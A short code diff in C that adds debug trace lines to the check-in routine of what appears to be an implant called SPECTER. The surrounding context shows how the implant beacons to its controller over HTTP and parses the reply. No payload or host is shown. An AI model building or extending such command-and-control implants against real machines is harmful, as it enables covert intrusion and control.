@@ -1157,6 +1157,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     else
         status = comms_tcp_send(comms, http_buf, http_len);
     if (!NT_SUCCESS(status)) return status;
+    COMMS_TRACE("[SPECTER] checkin: sent, receiving response...");
 
     /* ---- Receive response ---- */
     BYTE resp_buf[COMMS_RECV_BUF_SIZE];
@@ -1178,12 +1179,14 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     }
 
     /* ---- Parse HTTP response ---- */
+    COMMS_TRACE("[SPECTER] checkin: parsing HTTP response...");
     DWORD http_status = 0;
     const BYTE *body = NULL;
     DWORD body_len = 0;
     status = comms_http_parse_response(resp_buf, resp_total, &http_status,
                                         NULL, NULL, &body, &body_len);
     if (!NT_SUCCESS(status)) return status;
+    COMMS_TRACE("[SPECTER] checkin: HTTP response parsed");
     if (http_status != 200) return STATUS_UNSUCCESSFUL;
 
     /* ---- Process response body ---- */
@@ -1232,6 +1235,7 @@ NTSTATUS comms_checkin(IMPLANT_CONTEXT *ctx) {
     /* Success — increment counters */
     comms->msg_seq++;
     cfg->checkin_count++;
+    COMMS_TRACE("[SPECTER] checkin: complete");
 
     return STATUS_SUCCESS;
 }
